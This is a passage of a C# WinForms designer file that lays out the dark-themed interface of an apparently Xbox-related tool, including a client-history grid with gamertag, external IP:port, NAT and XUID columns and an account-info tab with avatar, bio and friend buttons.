            this.metroPanel52.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel52.HorizontalScrollbarSize = 10;
            this.metroPanel52.Location = new System.Drawing.Point(203, 94);
            this.metroPanel52.Name = "metroPanel52";
            this.metroPanel52.Size = new System.Drawing.Size(567, 2);
            this.metroPanel52.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel52.TabIndex = 49;
            this.metroPanel52.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel52.VerticalScrollbarBarColor = true;
            this.metroPanel52.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel52.VerticalScrollbarSize = 10;
            // 
            // metroPanel51
            // 
            this.metroPanel51.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel51.CustomBackground = true;
            this.metroPanel51.HorizontalScrollbarBarColor = true;
            this.metroPanel51.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel51.HorizontalScrollbarSize = 10;
            this.metroPanel51.Location = new System.Drawing.Point(203, 73);
            this.metroPanel51.Name = "metroPanel51";
            this.metroPanel51.Size = new System.Drawing.Size(567, 2);
            this.metroPanel51.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel51.TabIndex = 48;
            this.metroPanel51.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel51.VerticalScrollbarBarColor = true;
            this.metroPanel51.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel51.VerticalScrollbarSize = 10;
            // 
            // metroPanel50
            // 
            this.metroPanel50.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel50.CustomBackground = true;
            this.metroPanel50.HorizontalScrollbarBarColor = true;
            this.metroPanel50.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel50.HorizontalScrollbarSize = 10;
            this.metroPanel50.Location = new System.Drawing.Point(203, 52);
            this.metroPanel50.Name = "metroPanel50";
            this.metroPanel50.Size = new System.Drawing.Size(567, 2);
            this.metroPanel50.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel50.TabIndex = 47;
            this.metroPanel50.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel50.VerticalScrollbarBarColor = true;
            this.metroPanel50.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel50.VerticalScrollbarSize = 10;
            // 
            // metroPanel49
            // 
            this.metroPanel49.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel49.CustomBackground = true;
            this.metroPanel49.HorizontalScrollbarBarColor = true;
            this.metroPanel49.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel49.HorizontalScrollbarSize = 10;
            this.metroPanel49.Location = new System.Drawing.Point(203, 31);
            this.metroPanel49.Name = "metroPanel49";
            this.metroPanel49.Size = new System.Drawing.Size(567, 2);
            this.metroPanel49.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel49.TabIndex = 46;
            this.metroPanel49.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel49.VerticalScrollbarBarColor = true;
            this.metroPanel49.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel49.VerticalScrollbarSize = 10;
            // 
            // metroPanel48
            // 
            this.metroPanel48.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel48.CustomBackground = true;
            this.metroPanel48.HorizontalScrollbarBarColor = true;
            this.metroPanel48.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel48.HorizontalScrollbarSize = 10;
            this.metroPanel48.Location = new System.Drawing.Point(360, 14);
            this.metroPanel48.Name = "metroPanel48";
            this.metroPanel48.Size = new System.Drawing.Size(2, 271);
            this.metroPanel48.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel48.TabIndex = 38;
            this.metroPanel48.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel48.VerticalScrollbarBarColor = true;
            this.metroPanel48.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel48.VerticalScrollbarSize = 10;
            // 
            // metroPanel47
            // 
            this.metroPanel47.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel47.CustomBackground = true;
            this.metroPanel47.HorizontalScrollbarBarColor = true;
            this.metroPanel47.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel47.HorizontalScrollbarSize = 10;
            this.metroPanel47.Location = new System.Drawing.Point(519, 14);
            this.metroPanel47.Name = "metroPanel47";
            this.metroPanel47.Size = new System.Drawing.Size(2, 271);
            this.metroPanel47.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel47.TabIndex = 37;
            this.metroPanel47.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel47.VerticalScrollbarBarColor = true;
            this.metroPanel47.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel47.VerticalScrollbarSize = 10;
            // 
            // metroPanel46
            // 
            this.metroPanel46.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel46.CustomBackground = true;
            this.metroPanel46.HorizontalScrollbarBarColor = true;
            this.metroPanel46.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel46.HorizontalScrollbarSize = 10;
            this.metroPanel46.Location = new System.Drawing.Point(584, 14);
            this.metroPanel46.Name = "metroPanel46";
            this.metroPanel46.Size = new System.Drawing.Size(2, 271);
            this.metroPanel46.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel46.TabIndex = 36;
            this.metroPanel46.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel46.VerticalScrollbarBarColor = true;
            this.metroPanel46.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel46.VerticalScrollbarSize = 10;
            // 
            // metroPanel45
            // 
            this.metroPanel45.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel45.CustomBackground = true;
            this.metroPanel45.HorizontalScrollbarBarColor = true;
            this.metroPanel45.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel45.HorizontalScrollbarSize = 10;
            this.metroPanel45.Location = new System.Drawing.Point(768, 14);
            this.metroPanel45.Name = "metroPanel45";
            this.metroPanel45.Size = new System.Drawing.Size(2, 271);
            this.metroPanel45.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel45.TabIndex = 35;
            this.metroPanel45.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel45.VerticalScrollbarBarColor = true;
            this.metroPanel45.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel45.VerticalScrollbarSize = 10;
            // 
            // metroPanel44
            // 
            this.metroPanel44.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel44.CustomBackground = true;
            this.metroPanel44.HorizontalScrollbarBarColor = true;
            this.metroPanel44.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel44.HorizontalScrollbarSize = 10;
            this.metroPanel44.Location = new System.Drawing.Point(203, 283);
            this.metroPanel44.Name = "metroPanel44";
            this.metroPanel44.Size = new System.Drawing.Size(567, 2);
            this.metroPanel44.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel44.TabIndex = 34;
            this.metroPanel44.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel44.VerticalScrollbarBarColor = true;
            this.metroPanel44.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel44.VerticalScrollbarSize = 10;
            // 
            // metroPanel43
            // 
            this.metroPanel43.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel43.CustomBackground = true;
            this.metroPanel43.HorizontalScrollbarBarColor = true;
            this.metroPanel43.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel43.HorizontalScrollbarSize = 10;
            this.metroPanel43.Location = new System.Drawing.Point(203, 13);
            this.metroPanel43.Name = "metroPanel43";
            this.metroPanel43.Size = new System.Drawing.Size(2, 271);
            this.metroPanel43.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel43.TabIndex = 29;
            this.metroPanel43.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel43.VerticalScrollbarBarColor = true;
            this.metroPanel43.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel43.VerticalScrollbarSize = 10;
            // 
            // TextBoxUsername
            // 
            this.TextBoxUsername.BackColor = System.Drawing.Color.Black;
            this.TextBoxUsername.CustomBackground = true;
            this.TextBoxUsername.CustomForeColor = true;
            this.TextBoxUsername.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.TextBoxUsername.Location = new System.Drawing.Point(367, 310);
            this.TextBoxUsername.Name = "TextBoxUsername";
            this.TextBoxUsername.Size = new System.Drawing.Size(245, 23);
            this.TextBoxUsername.Style = MetroFramework.MetroColorStyle.Black;
            this.TextBoxUsername.TabIndex = 24;
            this.TextBoxUsername.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.TextBoxUsername.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.TextBoxUsername.UseStyleColors = true;
            // 
            // ClientHistory
            // 
            this.ClientHistory.AllowUserToAddRows = false;
            dataGridViewCellStyle10.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.ClientHistory.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle10;
            this.ClientHistory.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.ClientHistory.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.ClientHistory.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.Sunken;
            this.ClientHistory.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle11.Font = new System.Drawing.Font("Segoe UI", 9F);
            dataGridViewCellStyle11.ForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle11.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle11.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle11.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.ClientHistory.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle11;
            this.ClientHistory.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.ClientHistory.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn5,
            this.dataGridViewTextBoxColumn6,
            this.dataGridViewTextBoxColumn7,
            this.dataGridViewTextBoxColumn8,
            this.dataGridViewTextBoxColumn9});
            this.ClientHistory.ContextMenuStrip = this.contextMenuStrip1;
            dataGridViewCellStyle12.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle12.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle12.Font = new System.Drawing.Font("Segoe UI", 9F);
            dataGridViewCellStyle12.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            dataGridViewCellStyle12.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle12.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle12.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.ClientHistory.DefaultCellStyle = dataGridViewCellStyle12;
            this.ClientHistory.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.ClientHistory.EnableHeadersVisualStyles = false;
            this.ClientHistory.GridColor = System.Drawing.Color.LightSeaGreen;
            this.ClientHistory.Location = new System.Drawing.Point(203, 13);
            this.ClientHistory.MultiSelect = false;
            this.ClientHistory.Name = "ClientHistory";
            this.ClientHistory.ReadOnly = true;
            this.ClientHistory.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            dataGridViewCellStyle13.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle13.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle13.Font = new System.Drawing.Font("Segoe UI", 9F);
            dataGridViewCellStyle13.ForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle13.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle13.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle13.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.ClientHistory.RowHeadersDefaultCellStyle = dataGridViewCellStyle13;
            this.ClientHistory.RowHeadersVisible = false;
            dataGridViewCellStyle14.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle14.Font = new System.Drawing.Font("Segoe UI", 9F);
            dataGridViewCellStyle14.ForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle14.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle14.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            this.ClientHistory.RowsDefaultCellStyle = dataGridViewCellStyle14;
            this.ClientHistory.RowTemplate.DefaultCellStyle.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.ClientHistory.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.ClientHistory.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.ClientHistory.Size = new System.Drawing.Size(567, 272);
            this.ClientHistory.TabIndex = 22;
            // 
            // dataGridViewTextBoxColumn5
            // 
            this.dataGridViewTextBoxColumn5.FillWeight = 140F;
            this.dataGridViewTextBoxColumn5.HeaderText = "Gamertag";
            this.dataGridViewTextBoxColumn5.Name = "dataGridViewTextBoxColumn5";
            this.dataGridViewTextBoxColumn5.ReadOnly = true;
            this.dataGridViewTextBoxColumn5.Width = 158;
            // 
            // dataGridViewTextBoxColumn6
            // 
            this.dataGridViewTextBoxColumn6.FillWeight = 105F;
            this.dataGridViewTextBoxColumn6.HeaderText = "External:Port";
            this.dataGridViewTextBoxColumn6.Name = "dataGridViewTextBoxColumn6";
            this.dataGridViewTextBoxColumn6.ReadOnly = true;
            this.dataGridViewTextBoxColumn6.Width = 159;
            // 
            // dataGridViewTextBoxColumn7
            // 
            this.dataGridViewTextBoxColumn7.HeaderText = "NAT";
            this.dataGridViewTextBoxColumn7.Name = "dataGridViewTextBoxColumn7";
            this.dataGridViewTextBoxColumn7.ReadOnly = true;
            this.dataGridViewTextBoxColumn7.Width = 65;
            // 
            // dataGridViewTextBoxColumn8
            // 
            this.dataGridViewTextBoxColumn8.HeaderText = "Join Time";
            this.dataGridViewTextBoxColumn8.Name = "dataGridViewTextBoxColumn8";
            this.dataGridViewTextBoxColumn8.ReadOnly = true;
            this.dataGridViewTextBoxColumn8.Width = 185;
            // 
            // dataGridViewTextBoxColumn9
            // 
            this.dataGridViewTextBoxColumn9.HeaderText = "XUID";
            this.dataGridViewTextBoxColumn9.Name = "dataGridViewTextBoxColumn9";
            this.dataGridViewTextBoxColumn9.ReadOnly = true;
            this.dataGridViewTextBoxColumn9.Width = 145;
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem2});
            this.contextMenuStrip1.Name = "contextMenuStrip2";
            this.contextMenuStrip1.ShowImageMargin = false;
            this.contextMenuStrip1.Size = new System.Drawing.Size(91, 26);
            // 
            // toolStripMenuItem2
            // 
            this.toolStripMenuItem2.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
            this.toolStripMenuItem2.Size = new System.Drawing.Size(90, 22);
            this.toolStripMenuItem2.Text = "Copy IP";
            this.toolStripMenuItem2.Click += new System.EventHandler(this.toolStripMenuItem2_Click);
            // 
            // metroTabPage5
            // 
            this.metroTabPage5.Controls.Add(this.metroPanel61);
            this.metroTabPage5.Controls.Add(this.metroPanel64);
            this.metroTabPage5.Controls.Add(this.metroPanel63);
            this.metroTabPage5.Controls.Add(this.metroPanel62);
            this.metroTabPage5.Controls.Add(this.richTextBox1);
            this.metroTabPage5.Enabled = true;
            this.metroTabPage5.HorizontalScrollbarBarColor = true;
            this.metroTabPage5.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage5.Name = "metroTabPage5";
            this.metroTabPage5.Size = new System.Drawing.Size(969, 372);
            this.metroTabPage5.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroTabPage5.TabIndex = 4;
            this.metroTabPage5.Text = "   News";
            this.metroTabPage5.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTabPage5.VerticalScrollbarBarColor = true;
            this.metroTabPage5.Visible = false;
            // 
            // metroPanel61
            // 
            this.metroPanel61.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel61.CustomBackground = true;
            this.metroPanel61.HorizontalScrollbarBarColor = true;
            this.metroPanel61.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel61.HorizontalScrollbarSize = 10;
            this.metroPanel61.Location = new System.Drawing.Point(0, 0);
            this.metroPanel61.Name = "metroPanel61";
            this.metroPanel61.Size = new System.Drawing.Size(969, 2);
            this.metroPanel61.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel61.TabIndex = 46;
            this.metroPanel61.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel61.VerticalScrollbarBarColor = true;
            this.metroPanel61.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel61.VerticalScrollbarSize = 10;
            // 
            // metroPanel64
            // 
            this.metroPanel64.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel64.CustomBackground = true;
            this.metroPanel64.HorizontalScrollbarBarColor = true;
            this.metroPanel64.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel64.HorizontalScrollbarSize = 10;
            this.metroPanel64.Location = new System.Drawing.Point(968, 0);
            this.metroPanel64.Name = "metroPanel64";
            this.metroPanel64.Size = new System.Drawing.Size(2, 332);
            this.metroPanel64.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel64.TabIndex = 45;
            this.metroPanel64.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel64.VerticalScrollbarBarColor = true;
            this.metroPanel64.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel64.VerticalScrollbarSize = 10;
            // 
            // metroPanel63
            // 
            this.metroPanel63.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel63.CustomBackground = true;
            this.metroPanel63.HorizontalScrollbarBarColor = true;
            this.metroPanel63.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel63.HorizontalScrollbarSize = 10;
            this.metroPanel63.Location = new System.Drawing.Point(0, 2);
            this.metroPanel63.Name = "metroPanel63";
            this.metroPanel63.Size = new System.Drawing.Size(2, 332);
            this.metroPanel63.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel63.TabIndex = 44;
            this.metroPanel63.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel63.VerticalScrollbarBarColor = true;
            this.metroPanel63.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel63.VerticalScrollbarSize = 10;
            // 
            // metroPanel62
            // 
            this.metroPanel62.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel62.CustomBackground = true;
            this.metroPanel62.HorizontalScrollbarBarColor = true;
            this.metroPanel62.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel62.HorizontalScrollbarSize = 10;
            this.metroPanel62.Location = new System.Drawing.Point(2, 331);
            this.metroPanel62.Name = "metroPanel62";
            this.metroPanel62.Size = new System.Drawing.Size(968, 2);
            this.metroPanel62.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel62.TabIndex = 43;
            this.metroPanel62.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel62.VerticalScrollbarBarColor = true;
            this.metroPanel62.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel62.VerticalScrollbarSize = 10;
            // 
            // richTextBox1
            // 
            this.richTextBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.richTextBox1.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.richTextBox1.Location = new System.Drawing.Point(0, 0);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.ReadOnly = true;
            this.richTextBox1.Size = new System.Drawing.Size(970, 333);
            this.richTextBox1.TabIndex = 22;
            this.richTextBox1.Text = "";
            // 
            // metroTabPage7
            // 
            this.metroTabPage7.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.metroTabPage7.Controls.Add(this.metroPanel69);
            this.metroTabPage7.Controls.Add(this.GamertagProfileLookupName);
            this.metroTabPage7.Controls.Add(this.LookupProfileBtn);
            this.metroTabPage7.Controls.Add(this.ViewMyProfileBtn);
            this.metroTabPage7.Enabled = true;
            this.metroTabPage7.HorizontalScrollbarBarColor = true;
            this.metroTabPage7.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage7.Name = "metroTabPage7";
            this.metroTabPage7.Size = new System.Drawing.Size(969, 372);
            this.metroTabPage7.TabIndex = 6;
            this.metroTabPage7.Text = "Account Info";
            this.metroTabPage7.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTabPage7.VerticalScrollbarBarColor = true;
            this.metroTabPage7.Visible = false;
            // 
            // metroPanel69
            // 
            this.metroPanel69.Controls.Add(this.panel20);
            this.metroPanel69.Controls.Add(this.panel19);
            this.metroPanel69.Controls.Add(this.panel18);
            this.metroPanel69.Controls.Add(this.panel17);
            this.metroPanel69.Controls.Add(this.CopyAvatarBtn);
            this.metroPanel69.Controls.Add(this.SetActivityFeedBtn);
            this.metroPanel69.Controls.Add(this.label12);
            this.metroPanel69.Controls.Add(this.AvatarBtnSet);
            this.metroPanel69.Controls.Add(this.Avi);
            this.metroPanel69.Controls.Add(this.XboxProfilePic);
            this.metroPanel69.Controls.Add(this.ProfileLocation);
            this.metroPanel69.Controls.Add(this.SetBioBtn);
            this.metroPanel69.Controls.Add(this.AddFriendBtn);
            this.metroPanel69.Controls.Add(this.SetLocationBtn);
            this.metroPanel69.Controls.Add(this.DeleteFriendBtn);
            this.metroPanel69.Controls.Add(this.label11);
            this.metroPanel69.Controls.Add(this.label10);
            this.metroPanel69.Controls.Add(this.metroPanel70);
            this.metroPanel69.Controls.Add(this.BIO);
            this.metroPanel69.HorizontalScrollbarBarColor = true;
            this.metroPanel69.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel69.HorizontalScrollbarSize = 10;
            this.metroPanel69.Location = new System.Drawing.Point(7, 31);
            this.metroPanel69.Name = "metroPanel69";
            this.metroPanel69.Size = new System.Drawing.Size(948, 332);
            this.metroPanel69.TabIndex = 55;
            this.metroPanel69.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel69.VerticalScrollbarBarColor = true;
            this.metroPanel69.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel69.VerticalScrollbarSize = 10;
            // 
            // panel20
            // 
            this.panel20.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel20.Location = new System.Drawing.Point(333, 216);
            this.panel20.Name = "panel20";
            this.panel20.Size = new System.Drawing.Size(261, 2);
            this.panel20.TabIndex = 77;
            // 
            // panel19
            // 
            this.panel19.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel19.Location = new System.Drawing.Point(332, 86);
            this.panel19.Name = "panel19";
            this.panel19.Size = new System.Drawing.Size(261, 2);
            this.panel19.TabIndex = 76;
            // 
            // panel18
            // 
            this.panel18.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel18.Location = new System.Drawing.Point(332, 86);
            this.panel18.Name = "panel18";
            this.panel18.Size = new System.Drawing.Size(2, 132);
            this.panel18.TabIndex = 75;
            // 
            // panel17
            // 
            this.panel17.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel17.Location = new System.Drawing.Point(592, 86);
            this.panel17.Name = "panel17";
            this.panel17.Size = new System.Drawing.Size(2, 132);
            this.panel17.TabIndex = 74;
            // 
            // CopyAvatarBtn
            // 
            this.CopyAvatarBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.CopyAvatarBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.CopyAvatarBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.CopyAvatarBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.CopyAvatarBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.CopyAvatarBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.CopyAvatarBtn.Location = new System.Drawing.Point(743, 288);
            this.CopyAvatarBtn.Name = "CopyAvatarBtn";
            this.CopyAvatarBtn.Size = new System.Drawing.Size(137, 25);
            this.CopyAvatarBtn.TabIndex = 73;
            this.CopyAvatarBtn.Text = "Copy Avatar";
            this.CopyAvatarBtn.UseVisualStyleBackColor = true;
            this.CopyAvatarBtn.Click += new System.EventHandler(this.CopyAvatarBtn_Click);
            // 
            // SetActivityFeedBtn
            // 
            this.SetActivityFeedBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.SetActivityFeedBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.SetActivityFeedBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.SetActivityFeedBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.SetActivityFeedBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SetActivityFeedBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SetActivityFeedBtn.Location = new System.Drawing.Point(501, 59);
            this.SetActivityFeedBtn.Name = "SetActivityFeedBtn";
            this.SetActivityFeedBtn.Size = new System.Drawing.Size(36, 25);
            this.SetActivityFeedBtn.TabIndex = 72;
            this.SetActivityFeedBtn.Text = "Set";
            this.SetActivityFeedBtn.UseVisualStyleBackColor = true;
            this.SetActivityFeedBtn.Click += new System.EventHandler(this.SetActivityFeedBtn_Click);
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.label12.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold);
            this.label12.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.label12.Location = new System.Drawing.Point(414, 66);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(82, 17);
            this.label12.TabIndex = 71;
            this.label12.Text = "Activity Feed:";
            // 
            // AvatarBtnSet
            // 
            this.AvatarBtnSet.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.AvatarBtnSet.Cursor = System.Windows.Forms.Cursors.Hand;
            this.AvatarBtnSet.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.AvatarBtnSet.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.AvatarBtnSet.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.AvatarBtnSet.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.AvatarBtnSet.Location = new System.Drawing.Point(743, 257);
            this.AvatarBtnSet.Name = "AvatarBtnSet";
            this.AvatarBtnSet.Size = new System.Drawing.Size(137, 25);
            this.AvatarBtnSet.TabIndex = 62;
            this.AvatarBtnSet.Text = "Set Avatar";
            this.AvatarBtnSet.UseVisualStyleBackColor = true;
            this.AvatarBtnSet.Click += new System.EventHandler(this.button34_Click);
            // 
            // Avi
            // 
            this.Avi.ErrorImage = ((System.Drawing.Image)(resources.GetObject("Avi.ErrorImage")));
            this.Avi.Location = new System.Drawing.Point(743, 13);
            this.Avi.Name = "Avi";
            this.Avi.Size = new System.Drawing.Size(137, 238);
            this.Avi.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.Avi.TabIndex = 70;
            this.Avi.TabStop = false;
            // 
            // XboxProfilePic
            // 
            this.XboxProfilePic.ErrorImage = ((System.Drawing.Image)(resources.GetObject("XboxProfilePic.ErrorImage")));
            this.XboxProfilePic.Location = new System.Drawing.Point(600, 13);
            this.XboxProfilePic.Name = "XboxProfilePic";
            this.XboxProfilePic.Size = new System.Drawing.Size(137, 126);
            this.XboxProfilePic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
